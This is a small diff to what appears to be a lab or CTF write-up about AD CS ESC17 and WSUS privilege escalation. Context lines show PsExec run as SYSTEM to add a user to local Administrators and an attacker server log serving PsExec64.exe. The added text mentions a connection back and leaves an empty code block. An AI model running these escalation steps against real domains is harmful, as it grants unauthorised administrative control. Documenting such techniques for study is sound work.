@@ -760,7 +760,7 @@ Certificate Templates
       ESC17                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
 ```
 
-# ESC17
+# ESC17 and WSUS 
 
 https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc17-enrollee-supplied-subject-for-server-authentication
 
@@ -874,5 +874,9 @@ PsExec64.exe /accepteula /s powershell.exe "net localgroup Administrators wallac
 [+] GET request for exe: /2cead5a0-cde3-4389-9e62-2903f783d585/PsExec64.exe
 ```
 
-Ill run 
+Ill run the command, then the service will run and make a connection back
+
+```python
+
+```
 
